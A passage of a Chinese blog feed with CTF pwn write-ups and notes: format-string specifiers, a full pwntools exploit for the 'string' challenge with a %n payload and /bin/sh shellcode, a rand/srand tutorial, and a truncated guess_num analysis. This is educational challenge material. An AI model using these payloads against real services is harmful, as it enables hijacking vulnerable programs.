id="基本的格式化字符串参数"><a href="#基本的格式化字符串参数" class="headerlink" title="基本的格式化字符串参数"></a>基本的格式化字符串参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i<span class="variable">$x</span>表示要泄漏偏移i处4字节长的16进制数据，%i<span class="variable">$lx</span>表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i<span class="variable">$s</span>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前<span class="built_in">printf</span>已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10<span class="variable">$n</span>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%<span class="variable">$hn</span>表示写入的地址空间为2字节，%<span class="variable">$hhn</span>表示写入的地址空间为1字节，%<span class="variable">$lln</span>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%<span class="variable">$hn</span>或%<span class="variable">$hhn</span>来适时调整。</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</span><br><span class="line"></span><br><span class="line">原文链接：https://www.anquanke.com/post/id/85785</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;格式化字符串漏洞基本原理&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞基本原理&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞基本原理&quot;&gt;&lt;/a&gt;格式化字符串漏洞基本原理&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>string</title>
    <link href="http://yoursite.com/2019/07/27/string/"/>
    <id>http://yoursite.com/2019/07/27/string/</id>
    <published>2019-07-27T06:23:40.598Z</published>
    <updated>2019-07-28T11:36:44.854Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec string</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/string'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">除了PIE，其他保护全开</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line">unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(<span class="string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span>);</span><br><span class="line">  puts(<span class="string">"Dragon say: HaHa! you were supposed to have a normal"</span>);</span><br><span class="line">  puts(<span class="string">"RPG game, but I have changed it! you have no weapon and "</span>);</span><br><span class="line">  puts(<span class="string">"skill! you could not defeat me !"</span>);</span><br><span class="line">  puts(<span class="string">"That's sound terrible! you meet final boss!but you level is ONE!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    <span class="built_in">read</span>(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> __readfsqword(0x28u) ^ v3;</span><br><span class="line"></span><br><span class="line">((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这句话的意思是：把v1强制转化成一个函数指针，然后调用这个函数。也就是说如果我们shellcode写到这个位置，就能直接调用。shellcode可以通过上面的<span class="built_in">read</span>函数来写进去。</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"A voice heard in your mind"</span>);</span><br><span class="line">    puts(<span class="string">"'Give me an address'"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">    puts(<span class="string">"And, you wish is:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;format);</span><br><span class="line">    puts(<span class="string">"Your wish is"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">    puts(<span class="string">"I hear it, I hear it...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  第二：需要让*a1 == a1[1]。a1是作为参数传进来的，通过回溯，我们发现 a1 就是在 main 函数中 定义的v3，是一个指向堆块的指针。其中v3[0]=68,v3[1]=85。也就是说当v3[0]==v3[1]时就能满足*a1 == a1[1]。利用格式化字符串漏洞可以修改</span><br><span class="line"></span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = 68;</span><br><span class="line">  v3[1] = 85;</span><br><span class="line">  puts(<span class="string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span>);</span><br><span class="line">  puts(<span class="string">"we will tell you two secret ..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[1] is %x\n"</span>, v4 + 4);</span><br><span class="line">  puts(<span class="string">"do not tell anyone "</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  puts(<span class="string">"The End.....Really?"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);secret[0] 就是 我们需要的地址。</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现在 地址有了，利用格式化字符串 将 *a1 == a1[1]，成功进入脆弱点，写入shellcode。</span><br><span class="line">这道题有一点需要注意，这是一个64位的程序，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。</span><br><span class="line"></span><br><span class="line">在输入address的时候，输入1234，并在 <span class="built_in">printf</span>(&amp;format, &amp;format)前下一个断点，查看我们输入的地址在栈中的位置：</span><br><span class="line">(gdb) x/10gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd5e8:0x00007ffff7a711480x00007ffff7dcfa00</span><br><span class="line">0x7fffffffd5f8:0x00007ffff7dcc2a00x0000000000000000</span><br><span class="line">0x7fffffffd608:0x00000000000000730x00007ffff7dcfa00</span><br><span class="line">0x7fffffffd618:0x00007ffff7a723f20x0000000000000000</span><br><span class="line">0x7fffffffd628:0x00007ffff7dd05600x00007fffffffdd20</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞请看另一篇文章。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("/home/xfgg/Downloads/string")</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,34288)</span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">n = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="built_in">print</span> n[:-1]</span><br><span class="line"><span class="built_in">print</span> int(n[:-1],16)</span><br><span class="line">addrs = int(n[:-1],16)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"addrs: "</span> + hex(addrs)</span><br><span class="line">p.recvuntil(<span class="string">'name be:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"susan"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'or up?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'\n"</span>)</span><br><span class="line">p.sendline(str(addrs))</span><br><span class="line">p.recvuntil(<span class="string">'you wish is:\n'</span>)</span><br><span class="line">payload = <span class="string">"%85c"</span> + <span class="string">"%7<span class="variable">$n</span>"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'USE YOU SPELL\n'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rand和srand函数</title>
    <link href="http://yoursite.com/2019/07/27/rang%E5%92%8Csrand%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/27/rang和srand函数的使用/</id>
    <published>2019-07-27T03:41:13.098Z</published>
    <updated>2019-07-27T04:06:37.079Z</updated>
    
    <content type="html"><![CDATA[<h3 id="函数的作用"><a href="#函数的作用" class="headerlink" title="函数的作用"></a>函数的作用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数</span><br><span class="line">int rand(void)//rand函数用来产生随机数，当然是伪随机数</span><br><span class="line"></span><br><span class="line">seed的作用： srand函数的作用是根据参数seed，设置一个随机起始点，而rand函数根据这个起始点，产生随机数序列。默认的随机种子为1.如果随机种子一样，rand函数所产生的随机序列也一样。因此,为使每次程序运行都能产生不同的随机序列，每次都应产生一个不同的种子参数。</span><br><span class="line"></span><br><span class="line">因为rand的内部实现是用线性同余法做的，它不是真的随机数，只不过是因为其周期特别长，所以有一定的范围里可看成是随机的，rand()会返回一随机数值，范围在0至RAND_MAX间。在调用此函数产生随机数前，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。rand()产生的是假随机数字，每次执行时是相同的。若要不同,以不同的值来初始化它.初始化的函数就是srand()。</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">返回0至RAND_MAX之间的随机整数值，RAND_MAX的范围最少是在32767之间（int），即双字节（16位数）。若用unsigned int 双字节是65535，四字节是4294967295的整数范围。</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//由于种子默认都是1，故每次运行都将输出：5 5 4 4 5 4 0 0 4 2</span><br><span class="line"></span><br><span class="line">//将seed指定为6的话</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand(6);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//每次运行都将输出：每次运行都将输出：4 1 5 1 4 3 4 4 2 2</span><br><span class="line"></span><br><span class="line">举例4：那么我们如何产生一个伪随机的种子呢？一般指定seed为当前系统流逝了的时间（单位为秒）：time_t time(0)：</span><br><span class="line"></span><br><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;ctime&gt;//时间函数  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand((unsigned)time(0));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">       第一次运行时输出：0 1 5 4 5 0 2 3 4 2</span><br><span class="line"></span><br><span class="line">       第二次：3 2 3 0 3 5 5 2 2 3</span><br><span class="line"></span><br><span class="line">       总之，每次运行结果将不一样，因为每次启动程序的时刻都不同</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/lianghui0811/article/details/76480664</span><br></pre></td></tr></table></figure><h3 id="关于time-t-time-0"><a href="#关于time-t-time-0" class="headerlink" title="关于time_t time(0)"></a>关于time_t time(0)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">time_t被定义为长整型，它返回从1970年1月1日零时零分零秒到目前为止所经过的时间，单位为秒。比如假设输出：</span><br><span class="line"></span><br><span class="line">       cout&lt;&lt;time(0);</span><br><span class="line"></span><br><span class="line">      值约为1169174701，约等于37（年）乘365（天）乘24（小时）乘3600（秒）（月日没算）。</span><br><span class="line"></span><br><span class="line">      另外，关于ran_num = rand() % 6，将rand()的返回值与6求模是必须的，这样才能确保目的随机数落在[0,6)之间，否则rand()的返回值本身可能是很巨大的。</span><br><span class="line"></span><br><span class="line">      一个通用的公式是：</span><br><span class="line"></span><br><span class="line">      要取得[a,b)之间的随机整数，使用(rand() % (b<span class="_">-a</span>))+ a（结果值将含a不含b）。在a为0的情况下，简写为rand() % b。</span><br><span class="line"></span><br><span class="line">      另外还有一种比较常用的产生随机种子的函数：</span><br><span class="line"></span><br><span class="line">       srand(time(NULL)); //是以当前时间为种子，产生随意数。其中,time(NULL)用来获取当前时间，本质上得到的是一个大整数，然后用这个数来随机数。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;函数的作用&quot;&gt;&lt;a href=&quot;#函数的作用&quot; class=&quot;headerlink&quot; title=&quot;函数的作用&quot;&gt;&lt;/a&gt;函数的作用&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>guess_num</title>
    <link href="http://yoursite.com/2019/07/27/guess_num/"/>
    <id>http://yoursite.com/2019/07/27/guess_num/</id>
    <published>2019-07-27T03:31:33.086Z</published>
    <updated>2019-07-27T04:02:25.396Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec guess_num</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guess_num'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">_int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char v7; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, 0LL);</span><br><span class="line">  gets((__int64)&amp;v7);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % 6 + 1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (unsigned int)(i + 1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    puts(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="built_in">return</span> 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_c3e中有system(<span class="string">"cat flag"</span>);</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000030 var_30          db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">-000000000000002D                 db ? ; undefined</span><br><span class="line">-000000000000002C                 db ? ; undefined</span><br><span class="line">-000000000000002B                 db ? ; undefined</span><br><span class="line">-000000000000002A                 db ? ; undefined</span><br><span class="line">-0000000000000029                 db ? ; undefined</span><br><span class="line">-0000000000000028                 db ? ; undefined</span><br><span class="line">-0000000000000027                 db ? ; undefined</span><br><span class="line">-0000000000000026                 db ? ; undefined</span><br><span class="line">-0000000000000025                 db ? ; undefined</span><br><span class="line">-0000000000000024                 db ? ; undefined</span><br><span class="line">-0000000000000023                 db ? ; undefined</span><br><span class="line">-0000000000000022                 db ? ; undefined</span><br><span class="line">-0000000000000021                 db ? ; undefined</span><br><span class="line">-0000000000000020                 db ? ; undefined</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018                 db ? ; undefined</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; 